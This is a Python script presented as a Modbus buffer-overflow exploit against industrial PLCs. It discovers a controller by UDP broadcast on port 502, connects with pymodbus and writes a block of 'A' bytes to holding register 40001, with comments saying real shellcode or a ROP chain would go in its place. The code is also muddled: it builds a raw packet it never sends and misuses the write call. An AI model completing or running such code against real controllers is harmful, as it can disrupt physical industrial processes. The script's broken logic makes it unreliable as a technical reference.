import socket
import struct
from pymodbus.client import ModbusTcpClient
import time

def discover_plc_ip(port=502):
    """Attempts to discover the PLC IP address via UDP broadcast on port 502."""
    broadcast_address = '<broadcast>'  # Use broadcast
    discover_message = b"PLC_Discovery_Request"  # Simple discovery message

    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM, socket.IPPROTO_UDP)
        sock.setsockopt(socket.SOL_SOCKET, socket.SO_BROADCAST, 1)  # Enable broadcast
        sock.settimeout(5)  # Set a timeout for receiving responses

        sock.sendto(discover_message, (broadcast_address, port))
        print("Sent PLC discovery request...")

        try:
            data, addr = sock.recvfrom(1024)
            print(f"Received response from: {addr[0]}")
            return addr[0]  # Return the IP address
        except socket.timeout:
            print("No response received within the timeout.")
            return None

    except Exception as e:
        print(f"Error during IP discovery: {e}")
        return None
    finally:
        if 'sock' in locals():
            sock.close()


def exploit_modbus_vulnerability(plc_ip, register_address, overflow_data):
    """Simulates a Modbus buffer overflow exploit."""

    try:
        client = ModbusTcpClient(plc_ip)
        client.connect()

        if client.is_socket_open():
            print(f"Connected to PLC at {plc_ip}")

            # Craft the malicious Modbus request
            # Modbus Function Code 6: Write Single Register
            # The vulnerability is hypothetical and triggered by writing
            # a large amount of data to a specific register.

            # Build the Modbus PDU (Protocol Data Unit) - the part after the MBAP
            # This is what pymodbus would normally handle.

            # Function code (Write Single Register)
            function_code = 6

            # Register Address (Target register - this is where we assume we have "privileged" access if the exploit works)
            # Example: 40001 for an output register (holding register)
            register_address_bytes = register_address.to_bytes(2, byteorder='big')

            # Value to write (overflow data)
            # Assume a specific data type for the register (e.g., 16-bit integer)
            # The overflow_data should be carefully crafted with return addresses in a real exploit
            value_bytes = overflow_data

            # Combine the PDU
            pdu = bytes([function_code]) + register_address_bytes + value_bytes

            # Send the Raw Modbus PDU.  This is where the bypass happens.
            try:
                result = client.write_registers(register_address, overflow_data)  # Modified line
                if result:
                    print("Successfully wrote data. Vulnerability exploited!")
                    print(result)
                else:
                    print("Failed to write data.")
            except Exception as e:
                print(f"Error writing data: {e}")
        else:
            print("Failed to connect to the PLC.")

    except Exception as e:
        print(f"Error: {e}")

    finally:
        if client and client.is_socket_open():
            client.close()
            print("Connection closed.")

# Main execution
if __name__ == "__main__":
    plc_ip = discover_plc_ip()

    if plc_ip:
        print(f"PLC IP address found: {plc_ip}")

        # Define parameters for the hypothetical exploit
        target_register = 40001  # Example holding register address
        overflow_size = 64  # Arbitrary overflow size (adjust based on the hypothetical vulnerability)

        # Create overflow data (in a real exploit, this would be carefully crafted shellcode/ROP chain)
        overflow_data = bytearray([0x41] * overflow_size)  # Fill with 'A's for demonstration

        print("Attempting to exploit the Modbus vulnerability...")
        exploit_modbus_vulnerability(plc_ip, target_register, overflow_data)

    else:
        print("PLC IP address not found. Exiting.")